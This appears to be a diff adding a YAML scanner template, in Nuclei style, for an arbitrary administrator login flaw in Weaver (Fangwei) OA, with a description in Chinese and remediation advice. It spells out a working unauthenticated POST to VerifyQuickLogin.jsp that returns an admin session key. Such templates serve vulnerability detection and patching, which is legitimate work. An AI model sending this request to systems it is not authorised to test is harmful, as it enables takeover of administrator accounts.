@@ -1,0 +1,23 @@
+id: Fangwei-OA-AdminLogin
+info:
+  name: 泛微OA 管理员任意登录
+  author:
+  - l0ne1y
+  description: |-
+    泛微OA 管理员任意登录
+    泛微 OA 系统存在管理员任意登录漏洞，攻击者可利用未授权接口访问获取管理员Session，进而实现管理员任意登录。
+  severity: high
+  remediation: |-
+    ## 官方修复方案
+    升级至最新版本。
+    ## 临时修复方案
+    联系官方客服获取修复补丁。
+requests:
+- matchers:
+  - type: word
+    words:
+    - sessionkey
+  path:
+  - '{{BaseURL}}/mobile/plugin/VerifyQuickLogin.jsp'
+  method: POST
+  body: identifier=1&language=1&ipaddress=127.0.0.1
